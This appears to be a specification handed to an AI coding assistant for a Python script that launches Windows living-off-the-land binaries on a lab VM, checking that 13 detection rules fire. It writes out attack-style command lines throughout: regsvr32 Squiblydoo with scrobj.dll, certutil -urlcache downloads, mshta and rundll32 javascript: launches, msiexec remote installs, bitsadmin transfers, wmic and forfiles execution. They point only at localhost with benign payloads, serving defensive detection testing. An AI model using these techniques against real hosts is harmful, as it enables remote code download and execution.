# Cursor Grok 4.5 — ShadowSensor Phase 7A Subphase 2 Simulation Script

## Purpose

Generate `scripts/simulate_subphase_2.py` — a simulation script that triggers all 13 LOLBin
detection rules from `rules/definitions/lolbins.yaml` and logs results to the ShadowSensor pipeline.

---

## Hard Constraints (non-negotiable)

1. Output file: `scripts/simulate_subphase_2.py` only. No other files modified.
2. Frozen files — do not touch:
   - `rules/engine.py`, `rules/definitions/*.yaml`, `scripts/run_pipeline.py`,
     `storage/database.py`, `normalizer/*.py`, `ml/`, `api/`, `tests/`,
     `data/`, `docs/`, `status.md`, `handover.md`, `committee.md`,
     `rule_insights.md`, `task.md`, `VM_RUN_GUIDE.md`
3. Every field value in every command comes from `rule_insights.md` — no invention.
4. Every attack path label maps directly to `rule_insights.md` entries.
5. If any value in this prompt conflicts with itself, STOP and report. Do not guess.
6. If `rule_insights.md` has a gap for any rule, STOP and report before writing that section.

---

## Critical Environment Notes (apply to every section)

### DB_PATH
```
DB_PATH = r"C:\ShadowSensor\data\shadowsensor.db"
```
This is HARDCODED. The live pipeline writes hits here. Do NOT compute it dynamically.

### REPO_ROOT and EXPORTS_DIR
```python
_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EXPORTS_DIR = os.path.join(_REPO_ROOT, "exports")
```

### Defender-blocked rules (D-f)
- `LOLBIN_RUNDLL32_SUSPICIOUS_001` and `LOLBIN_REGSVR32_001` are blocked pre-execution by
  Windows Defender. These may raise `PermissionError` at `CreateProcess` or produce 0 DB hits.
  Treat as PARTIAL — DEFENDER_BLOCKED. Use `quick=True` in their `hits_since` calls.
  No `sys.exit` on 0 hits for these two rules.

### No FP suppression tests
None of the 13 lolbins rules have `parent_image` or other exclusion conditions.
Do NOT write any FP suppression test blocks. There are no scheduled-task FP tests in this script.

### Launch functions
All lolbins binaries are launched with `launch_argv()`, NOT with `ps()`.
Using `ps()` wraps the binary inside `powershell.exe -Command`, making
Sysmon log image=powershell.exe, which will NOT match `ends_with "mshta.exe"` etc.

### URLs in command lines
Use `http://127.0.0.1/` (localhost) for any URL argument. The rule fires on EID-1
(ProcessCreate command_line), not on the actual network connection. The process will fail
to connect but the Sysmon event is captured at launch.

### .NET tool paths
`regasm.exe`, `regsvcs.exe`, and `installutil.exe` may live in different .NET Framework
directories. Resolve their paths dynamically at script start using `glob.glob`. Use the
64-bit path if available, fallback to 32-bit. If neither is found, SKIP that rule with
a printed warning.

---

## BLOCK 0 — Imports and top-level constants

```python
import subprocess, datetime, time, sqlite3, csv, os, sys, glob

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EXPORTS_DIR = os.path.join(_REPO_ROOT, "exports")
DB_PATH = r"C:\ShadowSensor\data\shadowsensor.db"
os.makedirs(EXPORTS_DIR, exist_ok=True)

# .NET tool resolution
def _find_dotnet_tool(name: str) -> str | None:
    candidates = (
        glob.glob(rf"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\{name}")
        + glob.glob(rf"C:\Windows\Microsoft.NET\Framework\v4.0.30319\{name}")
    )
    return candidates[0] if candidates else None

REGASM_PATH    = _find_dotnet_tool("RegAsm.exe")
REGSVCS_PATH   = _find_dotnet_tool("RegSvcs.exe")
INSTALLUTIL_PATH = _find_dotnet_tool("InstallUtil.exe")

print("=" * 60)
print("ShadowSensor Phase 7A — Subphase 2: LOLBin Simulation")
print("=" * 60)
print("PREREQUISITE: Confirm pipeline is running before this script.")
print(f"Script UTC start: {datetime.datetime.utcnow().isoformat()}")
print(f"RegAsm     : {REGASM_PATH or 'NOT FOUND'}")
print(f"RegSvcs    : {REGSVCS_PATH or 'NOT FOUND'}")
print(f"InstallUtil: {INSTALLUTIL_PATH or 'NOT FOUND'}")
```

---

## BLOCK 1 — Helper functions

Implement these EXACTLY as written. Do not change polling durations.

```python
def hits_since(rule_id: str, since: datetime.datetime, quick: bool = False) -> int:
    since_str = since.strftime("%Y-%m-%d %H:%M:%S")

    def _query() -> int:
        conn = sqlite3.connect(DB_PATH)
        n = conn.execute(
            "SELECT COUNT(*) FROM rule_hits WHERE rule_id=? AND timestamp>=?",
            (rule_id, since_str)
        ).fetchone()[0]
        conn.close()
        return n

    if quick:
        return _query()

    # Poll up to 180 seconds for first hit
    deadline = time.time() + 180
    elapsed = 0
    while time.time() < deadline:
        n = _query()
        if n > 0:
            print(f"  [DB] First hit after ~{elapsed}s — waiting 30s for second launch", flush=True)
            time.sleep(30)
            n = _query()
            print(f"  [DB] Final count: {n} hit(s)", flush=True)
            return n
        time.sleep(5)
        elapsed += 5

    return _query()


def launch_argv(argv: list, label: str) -> None:
    print(f"  [LAUNCH] {label}")
    print(f"  [CMD]    {' '.join(str(a) for a in argv)}")
    try:
        subprocess.run(argv, capture_output=True, timeout=20)
    except subprocess.TimeoutExpired:
        print(f"  [WARN] Process timed out — Sysmon EID 1 captured at launch")
    except (PermissionError, OSError) as e:
        print(f"  [WARN] Process blocked by Defender (WinError {getattr(e, 'winerror', '?')}) — PARTIAL expected")
    time.sleep(2)


def warn_zero(rule_id: str, path: str) -> None:
    """Log warning on 0 hits — do NOT call sys.exit. Continue to next path."""
    print(f"  [WARN] 0 hits for {rule_id} {path} after full poll window — FAIL, continuing.")


results = []  # written to CSV at end
SIM_START = datetime.datetime.utcnow()
print(f"\nSimulation window start (UTC): {SIM_START.isoformat()}\n")
```

---

## BLOCK 2 — Pre-flight file setup

Before the first rule block, create dummy files needed by CERTUTIL paths.
These files are written to `C:\Windows\Temp\` which is writable by all users.

```python
# Dummy base64 file for certutil -decode (base64 of "ShadowSensor test")
with open(r"C:\Windows\Temp\ss_b64.txt", "w") as f:
    f.write("U2hhZG93U2Vuc29yIHRlc3Q=")

# Dummy hex file for certutil -decodehex (hex of "ShadowSensor test")
with open(r"C:\Windows\Temp\ss_hex.txt", "w") as f:
    f.write("536861646f7753656e736f722074657374")
```

---

## BLOCK 3 — Simulation rules (one section per rule)

### RULE 1: LOLBIN_MSHTA_001

Source: rule_insights.md LOLBIN_MSHTA_001
Trigger condition: image ends_with "mshta.exe" — any command line fires.
No exclusions. No Defender block. No FP suppression test.

3 attack paths. 2 launches per path. Use `launch_argv()`.

**Path A** — Remote HTA URL
- Launch 1: `["C:\\Windows\\System32\\mshta.exe", "http://127.0.0.1/payload_a1.hta"]`
- Launch 2: `["C:\\Windows\\System32\\mshta.exe", "http://127.0.0.1/payload_a2.hta"]`

**Path B** — Inline VBScript
- Launch 1: `["C:\\Windows\\System32\\mshta.exe", "vbscript:close"]`
- Launch 2: `["C:\\Windows\\System32\\mshta.exe", "vbscript:Execute(\"close\")"]`

**Path C** — Local HTA (nonexistent file — process launches, fails to open file, exits)
- Launch 1: `["C:\\Windows\\System32\\mshta.exe", "C:\\Windows\\Temp\\ss_test_1.hta"]`
- Launch 2: `["C:\\Windows\\System32\\mshta.exe", "C:\\Windows\\Temp\\ss_test_2.hta"]`

After BOTH launches per path, call `hits_since("LOLBIN_MSHTA_001", path_start)` (polling, not quick).
If n == 0: call `warn_zero(...)`, set result = "FAIL".
Else: result = "PASS" if n >= 2 else "FAIL".

---

### RULE 2: LOLBIN_RUNDLL32_SUSPICIOUS_001

Source: rule_insights.md LOLBIN_RUNDLL32_SUSPICIOUS_001
Trigger condition: image ends_with "rundll32.exe" AND command_line contains_any
  "javascript:" | "shell32.dll,ShellExec" | "shell32.dll,Control_RunDLL" | "http://" | "https://"
**DEFENDER-BLOCKED (D-f)**: Expected PermissionError or 0 hits. Use `quick=True`. Result = PARTIAL.

3 attack paths. 1 launch per path (process will be blocked). Use `launch_argv()`.

**Path A** — javascript: protocol
- Launch: `["C:\\Windows\\System32\\rundll32.exe", "javascript:\"\\.\\mshtml,RunHTMLApplication\";document.write()"]`
- `n = hits_since("LOLBIN_RUNDLL32_SUSPICIOUS_001", path_start, quick=True)`
- If n > 0: PASS. Else: PARTIAL — DEFENDER_BLOCKED.

**Path B** — ShellExec shim
- Launch: `["C:\\Windows\\System32\\rundll32.exe", "shell32.dll,ShellExec_RunDLL", "cmd.exe", "/c", "echo ShadowSensor_test"]`
- Same quick=True handling.

**Path C** — Remote HTTP URL
- Launch: `["C:\\Windows\\System32\\rundll32.exe", "http://127.0.0.1/a.dll,Entry"]`
- Same quick=True handling.

---

### RULE 3: LOLBIN_REGSVR32_001

Source: rule_insights.md LOLBIN_REGSVR32_001
Trigger condition: image ends_with "regsvr32.exe" AND command_line contains_any
  "/i:http" | "/i:https" | "/s /u /i" | "scrobj.dll"
**DEFENDER-BLOCKED (D-f)**: Expected PermissionError or 0 hits. Use `quick=True`. Result = PARTIAL.

3 attack paths. 1 launch per path. Use `launch_argv()`.

**Path A** — /i:http Squiblydoo
- Launch: `["C:\\Windows\\System32\\regsvr32.exe", "/s", "/i:http://127.0.0.1/a.sct", "scrobj.dll"]`
- `n = hits_since("LOLBIN_REGSVR32_001", path_start, quick=True)`
- If n > 0: PASS. Else: PARTIAL — DEFENDER_BLOCKED.

**Path B** — /i:https
- Launch: `["C:\\Windows\\System32\\regsvr32.exe", "/i:https://127.0.0.1/a.sct", "scrobj.dll"]`
- Same quick=True handling.

**Path C** — /s /u /i local SCT
- Launch: `["C:\\Windows\\System32\\regsvr32.exe", "/s", "/u", "/i:C:\\Windows\\Temp\\ss_test.sct", "scrobj.dll"]`
- Same quick=True handling.

---

### RULE 4: LOLBIN_CERTUTIL_001

Source: rule_insights.md LOLBIN_CERTUTIL_001
Trigger condition: image ends_with "certutil.exe" AND command_line contains_any
  "-decode" | "-decodehex" | "-urlcache" | "-f http" | "-f https"
No exclusions. No Defender block. No FP suppression test.

3 attack paths. 2 launches per path. Use `launch_argv()`.

**Path A** — urlcache download (will fail to connect to localhost, exits quickly)
- Launch 1: `["C:\\Windows\\System32\\certutil.exe", "-urlcache", "-split", "-f", "http://127.0.0.1/a_1.exe", "C:\\Windows\\Temp\\certutil_out_a1.bin"]`
- Launch 2: `["C:\\Windows\\System32\\certutil.exe", "-urlcache", "-f", "http://127.0.0.1/a_2.exe", "C:\\Windows\\Temp\\certutil_out_a2.bin"]`

**Path B** — -decode (uses dummy base64 file created in BLOCK 2)
- Launch 1: `["C:\\Windows\\System32\\certutil.exe", "-decode", "C:\\Windows\\Temp\\ss_b64.txt", "C:\\Windows\\Temp\\certutil_out_b1.bin"]`
- Launch 2: `["C:\\Windows\\System32\\certutil.exe", "-decode", "C:\\Windows\\Temp\\ss_b64.txt", "C:\\Windows\\Temp\\certutil_out_b2.bin"]`

**Path C** — -decodehex (uses dummy hex file created in BLOCK 2)
- Launch 1: `["C:\\Windows\\System32\\certutil.exe", "-decodehex", "C:\\Windows\\Temp\\ss_hex.txt", "C:\\Windows\\Temp\\certutil_out_c1.bin"]`
- Launch 2: `["C:\\Windows\\System32\\certutil.exe", "-decodehex", "C:\\Windows\\Temp\\ss_hex.txt", "C:\\Windows\\Temp\\certutil_out_c2.bin"]`

After both launches per path: `hits_since("LOLBIN_CERTUTIL_001", path_start)` (polling).

---

### RULE 5: LOLBIN_MSIEXEC_REMOTE_001

Source: rule_insights.md LOLBIN_MSIEXEC_REMOTE_001
Trigger condition: image ends_with "msiexec.exe" AND command_line contains_any
  "http://" | "https://" | "ftp://" | "/i http" | "/i ftp" | "/package http"
No exclusions. No Defender block. No FP suppression test.

3 attack paths. 2 launches per path. Use `launch_argv()`.
Note: msiexec will fail to download from localhost, exit quickly.

**Path A** — /i http
- Launch 1: `["C:\\Windows\\System32\\msiexec.exe", "/i", "http://127.0.0.1/pkg_a1.msi", "/qn"]`
- Launch 2: `["C:\\Windows\\System32\\msiexec.exe", "/i", "http://127.0.0.1/pkg_a2.msi", "/qn"]`

**Path B** — /package https
- Launch 1: `["C:\\Windows\\System32\\msiexec.exe", "/package", "https://127.0.0.1/pkg_b1.msi"]`
- Launch 2: `["C:\\Windows\\System32\\msiexec.exe", "/package", "https://127.0.0.1/pkg_b2.msi"]`

**Path C** — /i ftp
- Launch 1: `["C:\\Windows\\System32\\msiexec.exe", "/i", "ftp://127.0.0.1/pkg_c1.msi"]`
- Launch 2: `["C:\\Windows\\System32\\msiexec.exe", "/i", "ftp://127.0.0.1/pkg_c2.msi"]`

After both launches per path: `hits_since("LOLBIN_MSIEXEC_REMOTE_001", path_start)` (polling).

---

### RULE 6: LOLBIN_ODBCCONF_001

Source: rule_insights.md LOLBIN_ODBCCONF_001
Trigger condition: image ends_with "odbcconf.exe" AND command_line contains_any
  "regsvr" | "/a {" | "-a {" | "/f http" | "/f ftp"
No exclusions. No Defender block. No FP suppression test.

3 attack paths. 2 launches per path. Use `launch_argv()`.

**Path A** — /a {REGSVR ...}
- Launch 1: `["C:\\Windows\\System32\\odbcconf.exe", "/a", "{REGSVR C:\\Windows\\Temp\\ss_fake_1.dll}"]`
- Launch 2: `["C:\\Windows\\System32\\odbcconf.exe", "/a", "{REGSVR C:\\Windows\\Temp\\ss_fake_2.dll}"]`

**Path B** — -a {REGSVR ...}
- Launch 1: `["C:\\Windows\\System32\\odbcconf.exe", "-a", "{REGSVR C:\\Windows\\Temp\\ss_fake_3.dll}"]`
- Launch 2: `["C:\\Windows\\System32\\odbcconf.exe", "-a", "{REGSVR C:\\Windows\\Temp\\ss_fake_4.dll}"]`

**Path C** — /f http
- Launch 1: `["C:\\Windows\\System32\\odbcconf.exe", "/f", "http://127.0.0.1/a_c1.rsp"]`
- Launch 2: `["C:\\Windows\\System32\\odbcconf.exe", "/f", "http://127.0.0.1/a_c2.rsp"]`

After both launches per path: `hits_since("LOLBIN_ODBCCONF_001", path_start)` (polling).

---

### RULE 7: LOLBIN_CMSTP_001

Source: rule_insights.md LOLBIN_CMSTP_001
Trigger condition: image ends_with "cmstp.exe" — any command line fires.
No exclusions. No Defender block. No FP suppression test.

3 attack paths. 2 launches per path. Use `launch_argv()`.
Note: cmstp.exe may show a UI dialog or hang. The 20-second subprocess timeout handles this.
Do NOT use a bare launch (no args) — it will hang waiting for UI interaction.
Use `/s` (silent) with nonexistent INF files so the process exits quickly on all paths.

**Path A** — /s with INF (silent, fails quickly on nonexistent file)
- Launch 1: `["C:\\Windows\\System32\\cmstp.exe", "/s", "C:\\Windows\\Temp\\ss_inf_a1.inf"]`
- Launch 2: `["C:\\Windows\\System32\\cmstp.exe", "/s", "C:\\Windows\\Temp\\ss_inf_a2.inf"]`

**Path B** — /au (auto-elevate INF)
- Launch 1: `["C:\\Windows\\System32\\cmstp.exe", "/au", "C:\\Windows\\Temp\\ss_inf_b1.inf"]`
- Launch 2: `["C:\\Windows\\System32\\cmstp.exe", "/au", "C:\\Windows\\Temp\\ss_inf_b2.inf"]`

**Path C** — /u (uninstall) variant
- Launch 1: `["C:\\Windows\\System32\\cmstp.exe", "/u", "C:\\Windows\\Temp\\ss_inf_c1.inf"]`
- Launch 2: `["C:\\Windows\\System32\\cmstp.exe", "/u", "C:\\Windows\\Temp\\ss_inf_c2.inf"]`

After both launches per path: `hits_since("LOLBIN_CMSTP_001", path_start)` (polling).

---

### RULE 8: LOLBIN_HH_CHM_001

Source: rule_insights.md LOLBIN_HH_CHM_001
Trigger condition: image ends_with "hh.exe" AND command_line contains_any
  "http://" | "https://" | "javascript:" | "mk:@msitstore:" | "ftp://"
No exclusions. No Defender block. No FP suppression test.

3 attack paths. 2 launches per path. Use `launch_argv()`.
Note: hh.exe with javascript: must use a benign form that exits immediately.

**Path A** — Remote CHM URL
- Launch 1: `["C:\\Windows\\System32\\hh.exe", "http://127.0.0.1/help_a1.chm"]`
- Launch 2: `["C:\\Windows\\System32\\hh.exe", "http://127.0.0.1/help_a2.chm"]`

**Path B** — javascript: handler (benign, exits immediately)
- Launch 1: `["C:\\Windows\\System32\\hh.exe", "javascript:window.close()"]`
- Launch 2: `["C:\\Windows\\System32\\hh.exe", "javascript:close()"]`

**Path C** — mk:@MSITStore (nonexistent CHM, exits with error)
- Launch 1: `["C:\\Windows\\System32\\hh.exe", "mk:@MSITStore:C:\\Windows\\Temp\\ss_fake_c1.chm::/x.html"]`
- Launch 2: `["C:\\Windows\\System32\\hh.exe", "mk:@MSITStore:C:\\Windows\\Temp\\ss_fake_c2.chm::/x.html"]`

After both launches per path: `hits_since("LOLBIN_HH_CHM_001", path_start)` (polling).

---

### RULE 9: LOLBIN_REGASM_REGSVCS_001

Source: rule_insights.md LOLBIN_REGASM_REGSVCS_001
Trigger condition: image ends_with_any "regasm.exe" | "regsvcs.exe" — any launch fires.
No exclusions. No Defender block. No FP suppression test.

SKIP CHECK: If REGASM_PATH is None AND REGSVCS_PATH is None — print warning, add SKIP rows
to results for all 3 paths, continue to next rule. Do not sys.exit.

3 attack paths. 2 launches per path. Use `launch_argv()`.
Use nonexistent DLL path — process launches, fails to register, exits.

**Path A** — regasm.exe (uses REGASM_PATH)
- Launch 1: `[REGASM_PATH, "C:\\Windows\\Temp\\ss_fake_asm_a1.dll"]`
- Launch 2: `[REGASM_PATH, "C:\\Windows\\Temp\\ss_fake_asm_a2.dll"]`

**Path B** — regsvcs.exe (uses REGSVCS_PATH)
- Launch 1: `[REGSVCS_PATH, "C:\\Windows\\Temp\\ss_fake_svc_b1.dll"]`
- Launch 2: `[REGSVCS_PATH, "C:\\Windows\\Temp\\ss_fake_svc_b2.dll"]`

**Path C** — regasm.exe /U (unregister)
- Launch 1: `[REGASM_PATH, "/U", "C:\\Windows\\Temp\\ss_fake_asm_c1.dll"]`
- Launch 2: `[REGASM_PATH, "/U", "C:\\Windows\\Temp\\ss_fake_asm_c2.dll"]`

After both launches per path: `hits_since("LOLBIN_REGASM_REGSVCS_001", path_start)` (polling).

---

### RULE 10: LOLBIN_WMIC_PROCESS_001

Source: rule_insights.md LOLBIN_WMIC_PROCESS_001
Trigger condition: image ends_with "wmic.exe" AND command_line contains_any
  "process call create" | "call create" | "process where" | "/node:" | "win32_process"
No exclusions. No Defender block. No FP suppression test.

3 attack paths. 2 launches per path. Use `launch_argv()`.
IMPORTANT: WMIC process call create ACTUALLY spawns a process. Use safe benign commands only
(cmd.exe /c echo ShadowSensor_test). The spawned process exits immediately.
Full path to wmic.exe: `C:\Windows\System32\wbem\wmic.exe`

**Path A** — process call create
- Launch 1: `["C:\\Windows\\System32\\wbem\\wmic.exe", "process", "call", "create", "cmd.exe /c echo ShadowSensor_wmic_A1"]`
- Launch 2: `["C:\\Windows\\System32\\wbem\\wmic.exe", "process", "call", "create", "cmd.exe /c echo ShadowSensor_wmic_A2"]`

**Path B** — /node: remote (localhost node, connects to local WMI)
- Launch 1: `["C:\\Windows\\System32\\wbem\\wmic.exe", "/node:127.0.0.1", "process", "call", "create", "cmd.exe /c echo ShadowSensor_wmic_B1"]`
- Launch 2: `["C:\\Windows\\System32\\wbem\\wmic.exe", "/node:127.0.0.1", "process", "call", "create", "cmd.exe /c echo ShadowSensor_wmic_B2"]`

**Path C** — win32_process
- Launch 1: `["C:\\Windows\\System32\\wbem\\wmic.exe", "win32_process", "call", "create", "cmd.exe /c echo ShadowSensor_wmic_C1"]`
- Launch 2: `["C:\\Windows\\System32\\wbem\\wmic.exe", "win32_process", "call", "create", "cmd.exe /c echo ShadowSensor_wmic_C2"]`

After both launches per path: `hits_since("LOLBIN_WMIC_PROCESS_001", path_start)` (polling).

---

### RULE 11: LOLBIN_BITSADMIN_001

Source: rule_insights.md LOLBIN_BITSADMIN_001
Trigger condition: image ends_with "bitsadmin.exe" AND command_line contains_any
  "/transfer" | "/addfile" | "http://" | "https://" | "ftp://"
No exclusions. No Defender block. No FP suppression test.

3 attack paths. 2 launches per path. Use `launch_argv()`.
Note: bitsadmin will try to connect to localhost, fail quickly (connection refused). 20s timeout handles hang.

IMPORTANT: bitsadmin /transfer creates a persistent BITS job if the job doesn't exist yet.
After all bitsadmin paths, cancel all ShadowSensor BITS jobs:
`subprocess.run(["bitsadmin.exe", "/cancel", "ShadowSensor_job"], capture_output=True)`

**Path A** — /transfer http
- Launch 1: `["C:\\Windows\\System32\\bitsadmin.exe", "/transfer", "ShadowSensor_job_A1", "http://127.0.0.1/a1.exe", "C:\\Windows\\Temp\\bits_a1.bin"]`
- Launch 2: `["C:\\Windows\\System32\\bitsadmin.exe", "/transfer", "ShadowSensor_job_A2", "http://127.0.0.1/a2.exe", "C:\\Windows\\Temp\\bits_a2.bin"]`

**Path B** — /addfile
- Launch 1: `["C:\\Windows\\System32\\bitsadmin.exe", "/addfile", "ShadowSensor_job_B1", "http://127.0.0.1/b1.exe", "C:\\Windows\\Temp\\bits_b1.bin"]`
- Launch 2: `["C:\\Windows\\System32\\bitsadmin.exe", "/addfile", "ShadowSensor_job_B2", "http://127.0.0.1/b2.exe", "C:\\Windows\\Temp\\bits_b2.bin"]`

**Path C** — ftp URL
- Launch 1: `["C:\\Windows\\System32\\bitsadmin.exe", "/transfer", "ShadowSensor_job_C1", "ftp://127.0.0.1/c1.exe", "C:\\Windows\\Temp\\bits_c1.bin"]`
- Launch 2: `["C:\\Windows\\System32\\bitsadmin.exe", "/transfer", "ShadowSensor_job_C2", "ftp://127.0.0.1/c2.exe", "C:\\Windows\\Temp\\bits_c2.bin"]`

After all 3 paths: cancel BITS jobs (cleanup):
```python
for job in ["ShadowSensor_job_A1","ShadowSensor_job_A2","ShadowSensor_job_B1",
            "ShadowSensor_job_B2","ShadowSensor_job_C1","ShadowSensor_job_C2"]:
    subprocess.run(["bitsadmin.exe", "/cancel", job], capture_output=True)
```

After both launches per path: `hits_since("LOLBIN_BITSADMIN_001", path_start)` (polling).

---

### RULE 12: LOLBIN_INSTALLUTIL_001

Source: rule_insights.md LOLBIN_INSTALLUTIL_001
Trigger condition: image ends_with "installutil.exe" — any launch fires.
No exclusions. No Defender block. No FP suppression test.

SKIP CHECK: If INSTALLUTIL_PATH is None — print warning, add SKIP rows, continue.

3 attack paths. 2 launches per path. Use `launch_argv()`.
Use nonexistent DLL — process launches, fails to install, exits.

**Path A** — install malicious assembly
- Launch 1: `[INSTALLUTIL_PATH, "C:\\Windows\\Temp\\ss_fake_iu_a1.dll"]`
- Launch 2: `[INSTALLUTIL_PATH, "C:\\Windows\\Temp\\ss_fake_iu_a2.dll"]`

**Path B** — /U uninstall
- Launch 1: `[INSTALLUTIL_PATH, "/U", "C:\\Windows\\Temp\\ss_fake_iu_b1.dll"]`
- Launch 2: `[INSTALLUTIL_PATH, "/U", "C:\\Windows\\Temp\\ss_fake_iu_b2.dll"]`

**Path C** — bare launch (no args — exits immediately with usage message)
- Launch 1: `[INSTALLUTIL_PATH]`
- Launch 2: `[INSTALLUTIL_PATH]`

After both launches per path: `hits_since("LOLBIN_INSTALLUTIL_001", path_start)` (polling).

---

### RULE 13: LOLBIN_FORFILES_001

Source: rule_insights.md LOLBIN_FORFILES_001
Trigger condition: image ends_with "forfiles.exe" AND command_line contains_any
  "cmd" | "powershell" | "wscript" | "cscript" | "mshta" | "/c cmd" | "/c powershell"
No exclusions. No Defender block. No FP suppression test.

3 attack paths. 2 launches per path. Use `launch_argv()`.
IMPORTANT: forfiles /c ACTUALLY EXECUTES the command for each matched file.
Use safe benign commands only: `cmd /c echo ShadowSensor_test` and
`powershell -c Write-Host ShadowSensor_test`. The command runs and exits immediately.
Use `/m notepad.exe` to match exactly 1 file (minimises spurious executions).

**Path A** — /c cmd
- Launch 1: `["C:\\Windows\\System32\\forfiles.exe", "/p", "C:\\Windows\\System32", "/m", "notepad.exe", "/c", "cmd /c echo ShadowSensor_forfiles_A1"]`
- Launch 2: `["C:\\Windows\\System32\\forfiles.exe", "/p", "C:\\Windows\\System32", "/m", "notepad.exe", "/c", "cmd /c echo ShadowSensor_forfiles_A2"]`

**Path B** — /c powershell
- Launch 1: `["C:\\Windows\\System32\\forfiles.exe", "/p", "C:\\Windows\\System32", "/m", "notepad.exe", "/c", "powershell -c Write-Host ShadowSensor_forfiles_B1"]`
- Launch 2: `["C:\\Windows\\System32\\forfiles.exe", "/p", "C:\\Windows\\System32", "/m", "notepad.exe", "/c", "powershell -c Write-Host ShadowSensor_forfiles_B2"]`

**Path C** — /c wscript
- Launch 1: `["C:\\Windows\\System32\\forfiles.exe", "/p", "C:\\Windows\\System32", "/m", "notepad.exe", "/c", "wscript //nologo //b C:\\Windows\\Temp\\ss_fake.js"]`
- Launch 2: `["C:\\Windows\\System32\\forfiles.exe", "/p", "C:\\Windows\\System32", "/m", "notepad.exe", "/c", "cscript //nologo //b C:\\Windows\\Temp\\ss_fake.js"]`

After both launches per path: `hits_since("LOLBIN_FORFILES_001", path_start)` (polling).

---

## BLOCK 4 — Simulation window end

```python
SIM_END = datetime.datetime.utcnow()
print(f"\nSimulation window end (UTC): {SIM_END.isoformat()}")
```

---

## BLOCK 5 — Summary table

Print a summary table in this format:

```
RULE | PATH_A | PATH_B | PATH_C | OVERALL
LOLBIN_MSHTA_001          | PASS | PASS | PASS | PASS
LOLBIN_RUNDLL32_SUSPICIOUS_001 | PARTIAL | PARTIAL | PARTIAL | PARTIAL
...
```

Compute OVERALL: if rule is a Defender-blocked rule → PARTIAL.
Otherwise: PASS if all non-SKIP paths are PASS; FAIL if any path is FAIL; SKIP if all SKIP.

Print: `N/13 rules PASS, M PARTIAL (Defender-blocked), P FAIL, Q SKIP`

---

## BLOCK 6 — CSV export

Write to `os.path.join(EXPORTS_DIR, "subphase_2_training.csv")`.

Columns (exact): `rule_id, attack_path, field_values_used, result, reason, timestamp_utc`

One row per path per rule. Same format as Subphase 1.

---

## BLOCK 7 — Feature extraction instructions (print only, do not execute)

```
======================================================
NEXT STEPS — run manually after reviewing output above
======================================================

STEP 1 — Query DB for the confirmed UTC window of this subphase:
  <python> -c "
  import sqlite3; conn = sqlite3.connect(r'C:\ShadowSensor\data\shadowsensor.db');
  row = conn.execute(\"SELECT MIN(timestamp), MAX(timestamp) FROM rule_hits
    WHERE rule_id LIKE 'LOLBIN_%' AND timestamp >= '<paste SIM_START UTC here>'\").fetchone();
  print('Since:', row[0]); print('Until:', row[1]); conn.close()"

STEP 2 — Run feature extraction with the DB-confirmed timestamps:
  <python> <repo_root>\scripts\run_feature_extraction.py
    --label 1
    --since "YYYY-MM-DD HH:MM:SS"
    --until "YYYY-MM-DD HH:MM:SS"
    --output <repo_root>\data\features\suspicious_lolbins.csv

  Replace YYYY-MM-DD HH:MM:SS with MIN and MAX from STEP 1.
  Do NOT use VM wall-clock time. All timestamps in DB are UTC.
```

Use f-strings with DB_PATH and _REPO_ROOT to fill in the correct paths dynamically.

---

## Starter prompt for Grok

Give Grok this exact message before sharing this document:

> You are implementing a precise simulation script for a security detection project.
> You must follow the specification below EXACTLY — no deviations, no invented values, no assumptions.
> If anything is unclear or ambiguous, STOP and ask before writing that section.
> The specification is your only source of truth.

Then share this entire document.

---

## Script location

The generated script must be saved as:
```
scripts/simulate_subphase_2.py
```

Run command (from Z:\filelessmalware on the VM):
```powershell
& .\python_runtime\python.exe .\scripts\simulate_subphase_2.py
```
